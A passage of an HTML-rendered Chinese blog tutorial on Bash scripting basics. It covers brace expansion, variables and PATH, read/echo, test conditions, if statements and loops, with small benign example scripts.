class=\"line\">通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo &#123;a,b,c&#125;</span><br><span class=\"line\"> a b c</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo user&#123;<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>&#125;</span><br><span class=\"line\">user1 user5 user8</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo &#123;<span class=\"number\">0</span>..<span class=\"number\">10</span>&#125;</span><br><span class=\"line\"><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span> <span class=\"number\">4</span> <span class=\"number\">5</span> <span class=\"number\">6</span> <span class=\"number\">7</span> <span class=\"number\">8</span> <span class=\"number\">9</span> <span class=\"number\">10</span></span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>mkdir &#123;dir1,dir2,dir3&#125;</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>ls –ld dir&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h3><p>shell变量可以保存路径名、文件名或者一个数字等。分为三类：</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地变量: (局部变量)只在创建它们的<span class=\"keyword\">Shell</span><span class=\"bash\">中使用，可以在shell程序内任意使用和修改它</span></span><br><span class=\"line\">们。</span><br><span class=\"line\">环境变量: 可以在创建它们的<span class=\"keyword\">Shell</span><span class=\"bash\">及其派生出来的任意子程序中使用。有些变量是用户创建</span></span><br><span class=\"line\">的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在</span><br><span class=\"line\"><span class=\"keyword\">shell</span><span class=\"bash\">程序中使用它们 。还能在shell中加以修改。</span></span><br><span class=\"line\">内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。</span><br></pre></td></tr></table></figure>\n<h4 id=\"本地变量\"><a href=\"#本地变量\" class=\"headerlink\" title=\"本地变量\"></a>本地变量</h4><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地变量 在用户现在的shell生命期的脚本中使用</span><br><span class=\"line\"> 变量名=值</span><br><span class=\"line\"><span class=\"number\">1</span>.等号两边不可以有空格</span><br><span class=\"line\"><span class=\"number\">2</span>.取值包含空格，必须用双引号括起来</span><br><span class=\"line\"><span class=\"number\">3</span>.Shell变量可以用大小写字母，区分大小写</span><br><span class=\"line\"></span><br><span class=\"line\">变量是弱类型的, 不用声明类型</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 变量声明及赋值格式</span></span><br><span class=\"line\">变量=值（等号两边不能有空格）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 变量的引用</span></span><br><span class=\"line\"> <span class=\"variable\">$变</span>量名</span><br><span class=\"line\"> <span class=\"variable\">$&#123;</span>变量名&#125;</span><br><span class=\"line\"> 变量名为<span class=\"number\">1</span>个字符时建议使用方式一，多余一个字符时建议使用方式二</span><br><span class=\"line\"> 举例: <span class=\"variable\">$a</span> <span class=\"variable\">$&#123;</span>abc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清除变量</span></span><br><span class=\"line\">unset 变量名</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>name=Jack</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo <span class=\"variable\">$&#123;</span>name&#125;</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>unset name  <span class=\"comment\"># 注意,name前没有$</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置只读变量</span></span><br><span class=\"line\">设置变量时，不想再改变其值，可以将之设为只读变量</span><br><span class=\"line\"> 变量名=值</span><br><span class=\"line\"> readonly  变量名</span><br></pre></td></tr></table></figure>\n<h4 id=\"环境变量\"><a href=\"#环境变量\" class=\"headerlink\" title=\"环境变量\"></a>环境变量</h4><p>Bash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用</p>\n<p>内置环境变量</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">HOME:</span> 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者</span><br><span class=\"line\">家目录了。</span><br><span class=\"line\"><span class=\"symbol\">SHELL:</span> 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 <span class=\"meta-keyword\">/bin/</span>bash</span><br><span class=\"line\">PWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由</span><br><span class=\"line\">Linux自动设置的</span><br><span class=\"line\"><span class=\"symbol\">HISTSIZE:</span> 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”</span><br><span class=\"line\">则是由这个值来设定的。</span><br><span class=\"line\"><span class=\"symbol\">PATH:</span> 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由</span><br><span class=\"line\">PATH的变量内的目录来查询，所以，目录的顺序也很重要。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">环境变量可以在命令行中设置，但用户注销时这些值将丢失</span><br><span class=\"line\">   环境变量均为大写</span><br><span class=\"line\">   必须用<span class=\"built_in\">export</span>命令导出</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置环境变量</span></span><br><span class=\"line\">variable-name=value</span><br><span class=\"line\"><span class=\"built_in\">export</span> variable-name(环境变量名大写)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示环境变量</span></span><br><span class=\"line\">env 可以看到所有的环境变量</span><br><span class=\"line\"><span class=\"built_in\">echo</span> $环境变量名 （显示一个变量）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清除环境变量</span></span><br><span class=\"line\"><span class=\"built_in\">unset</span> 环境变量名</span><br></pre></td></tr></table></figure>\n<p>修改path环境变量</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。</span><br><span class=\"line\"><span class=\"comment\"># 命令行修改环境变量</span></span><br><span class=\"line\">以下在用户user主目录下操作：</span><br><span class=\"line\">mkdir shdir &amp;&amp; <span class=\"built_in\">cd</span> shdir</span><br><span class=\"line\">vi hello</span><br><span class=\"line\">chmod 755 hello</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ～</span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/shdir</span><br><span class=\"line\">在任何目录下，输入hello即可执行该文件。</span><br><span class=\"line\">本方式下环境变量如果修改错了，<span class=\"built_in\">exit</span>退出后重新登陆即可恢复系统默认的值。</span><br></pre></td></tr></table></figure>\n<p>配置文件中修改环境变量</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注意，修改环境变量前最好先备份一下旧的：</span><br><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">tem</span>=<span class=\"variable\">$PATH</span></span><br><span class=\"line\">echo <span class=\"variable\">$tem</span> &gt;&gt;pathbake</span><br><span class=\"line\"></span><br><span class=\"line\">需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -name “*profile”</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -name “<span class=\"number\">*ba</span>shrc”</span><br><span class=\"line\">全局配置文件/etc/profile</span><br><span class=\"line\">本地配置文件~/.bashrc</span><br></pre></td></tr></table></figure>\n<h4 id=\"内部变量\"><a href=\"#内部变量\" class=\"headerlink\" title=\"内部变量\"></a>内部变量</h4><p>内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">部分内部变量是：</span><br><span class=\"line\"><span class=\"symbol\">$</span># 传送给shell程序的位置参数的数量</span><br><span class=\"line\"><span class=\"symbol\">$</span>? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）</span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$0</span> shell程序的名称</span></span><br><span class=\"line\"><span class=\"symbol\">$</span>* 调用shell程序时所传送的全部参数的单字符串，<span class=\"string\">\"参数1\"</span>, <span class=\"string\">\"参数2\"</span>…形式保存的参数</span><br><span class=\"line\"><span class=\"symbol\">$</span>@ <span class=\"string\">\"参数1\"</span>, <span class=\"string\">\"参数2\"</span>…形式保存的参数</span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$n</span> 第n个参数</span></span><br><span class=\"line\"><span class=\"symbol\">$</span><span class=\"symbol\">$</span> 本程序的PID</span><br><span class=\"line\"><span class=\"symbol\">$</span>! 上一个命令的PID</span><br></pre></td></tr></table></figure>\n<h3 id=\"输入与输出\"><a href=\"#输入与输出\" class=\"headerlink\" title=\"输入与输出\"></a>输入与输出</h3><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># read 从键盘上读取变量的值</span><br><span class=\"line\">read  [选项]  变量名列表</span><br><span class=\"line\">    常用选项</span><br><span class=\"line\">    -<span class=\"ruby\">a ANAME   将输入读入ANAME的数组</span></span><br><span class=\"line\"><span class=\"ruby\">    -n NCHARS  读入N个字符</span></span><br><span class=\"line\"><span class=\"ruby\">    -p PROMPT  显示一个提示</span></span><br><span class=\"line\"><span class=\"ruby\">    -r         取消转移</span></span><br><span class=\"line\"><span class=\"ruby\">    -s         安静模式，输入的字符将不会提示</span></span><br><span class=\"line\"><span class=\"ruby\">    -t TIMEOUT 超过指定时间，read自动停止</span></span><br><span class=\"line\"><span class=\"ruby\"></span></span><br><span class=\"line\"><span class=\"ruby\"><span class=\"comment\"># echo 显示字符串或变量的值</span></span></span><br><span class=\"line\"><span class=\"ruby\">echo  [选项]  字符串</span></span><br><span class=\"line\"><span class=\"ruby\">    常用选项</span></span><br><span class=\"line\"><span class=\"ruby\">    -n  不在最后自动换行</span></span><br><span class=\"line\"><span class=\"ruby\">    -e  启用反斜线控制字符的转换</span></span><br><span class=\"line\"><span class=\"ruby\">    -E  不处理转义字符。此为缺省选项；</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 输入一句话，打印输入的话</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">'please type some words, I will print them: '</span> words</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$words</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"条件测试\"><a href=\"#条件测试\" class=\"headerlink\" title=\"条件测试\"></a>条件测试</h3><figure class=\"highlight subunit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># test</span><br><span class=\"line\"><span class=\"keyword\">test </span>条件表达式</span><br><span class=\"line\">如果测试条件为真，test命令会返回0，否则返回一个非0的数值</span><br><span class=\"line\"><span class=\"keyword\">test </span>语句与if/then和case语句一起，构成shell编程的控制转移结构</span><br><span class=\"line\"></span><br><span class=\"line\"># []</span><br><span class=\"line\">[ 条件表达式 ]</span><br><span class=\"line\">方括号的内侧两边各需一个空格</span><br><span class=\"line\"></span><br><span class=\"line\">条件表达式的值为真返回零，为假时返回非零值</span><br></pre></td></tr></table></figure>\n<h4 id=\"文件状态判断\"><a href=\"#文件状态判断\" class=\"headerlink\" title=\"文件状态判断\"></a>文件状态判断</h4><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-d <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>为目录文件，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-f <span class=\"keyword\">filename</span>\t文件是否存在且为普通文件，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-r <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可读，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-s <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>的长度大于<span class=\"number\">0</span>，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-w <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可写，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-x <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可执行，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-e <span class=\"keyword\">filename</span>\t文件是否存在</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 输入文件的绝对路径，判断文件是否存在</span></span><br><span class=\"line\"><span class=\"built_in\">read</span>  -p <span class=\"string\">'input file path: '</span> file</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'文件存在'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'文件不存在'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"条件语句\"><a href=\"#条件语句\" class=\"headerlink\" title=\"条件语句\"></a>条件语句</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  [ 条件表达式 ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列1</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    命令序列2</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">当<span class=\"string\">\"条件表达式\"</span>的测试值为真时，执行<span class=\"string\">\"命令序列1\"</span>，否则，执行<span class=\"string\">\"命令序列2\"</span>。命令序列中的命令</span><br><span class=\"line\">可以是一个或者多个。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ 条件表达式 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">当<span class=\"string\">\"条件表达式\"</span>的测试值为真时，执行<span class=\"string\">\"命令序列\"</span>,否则，执行条件语句后面的命令。条件表达</span><br><span class=\"line\">式与<span class=\"keyword\">then</span>之间的分号<span class=\"string\">\";\"</span>起命令分隔符的作用。</span><br><span class=\"line\"></span><br><span class=\"line\">语法形式三</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> 条件表达式1</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列1</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [ 条件表达式2 ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列2</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    命令序列3</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">这是包含二层嵌套的条件语句，当<span class=\"string\">\"条件表达式1\"</span>为真时，执行<span class=\"string\">\"命令序列1\"</span>,否则，在<span class=\"string\">\"条件表</span></span><br><span class=\"line\"><span class=\"string\">达式2\"</span>为真的情况下，执行<span class=\"string\">\"命令序列2\"</span>，否则，执行<span class=\"string\">\"命令序列3\"</span>,<span class=\"string\">\"命令序列3\"</span>属于第2个条</span><br><span class=\"line\">件语句的一部分。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 判断输入的路径是文件还是目录</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">'please input the file path: '</span> file</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -d <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'this is a directory'</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [ -f <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'this is a file'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'wrong file type, or the file do not exist'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数字操作符\"><a href=\"#数字操作符\" class=\"headerlink\" title=\"数字操作符\"></a>数字操作符</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n1 –eq n2判断数字n1与n2是否相等，若相等，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –ne n2判断数字n1与n2是否不等，若不等，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –lt n2判断数字n1是否小于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –gt n2判断数字n1是否大于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –le n2判断数字n1是否小于或等于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –ge n2 判断数字n1是否大于或等于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串操作符\"><a href=\"#字符串操作符\" class=\"headerlink\" title=\"字符串操作符\"></a>字符串操作符</h4><figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string非空，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">-n </span><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string长度大于0，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">-z </span><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string长度为0，则为返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">string1 </span>= <span class=\"keyword\">string2 </span>若字符串<span class=\"keyword\">string1和string2相等，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">string1 </span>!= <span class=\"keyword\">string2 </span>若字符串<span class=\"keyword\">string1和 </span><span class=\"keyword\">string2不等，则返回真</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"逻辑操作符\"><a href=\"#逻辑操作符\" class=\"headerlink\" title=\"逻辑操作符\"></a>逻辑操作符</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e1 –a e2\t逻辑表达式e1和e2同时为真时，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\">e1 –o e2\t逻辑表达式e1和e2有一个为真时，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\">! e1\t    若逻辑表达式e1不为真时，返回<span class=\"number\">0</span>，,否则，返回<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> 变量名 <span class=\"keyword\">in</span> 参数列表</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令列表</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\">将<span class=\"string\">\"参数列表\"</span>中的元素依次赋给<span class=\"string\">\"变量名\"</span>，在每次赋值后执行<span class=\"string\">\"命令列表\"</span>，<span class=\"string\">\"参数列表\"</span>表示<span class=\"string\">\"变</span></span><br><span class=\"line\"><span class=\"string\">量名\"</span>的取值范围</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> ((初始化变量值；结束循环条件；运算))</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ 条件表达式 ]</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令列表</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\">循环执行<span class=\"string\">\"命令列表\"</span>中的命令，直至<span class=\"string\">\"条件表达式\"</span>的值为假。</span><br><span class=\"line\"></span><br><span class=\"line\">Until [ 条件 ]</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\">Done</span><br><span class=\"line\">直到条件满足时循环结束</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 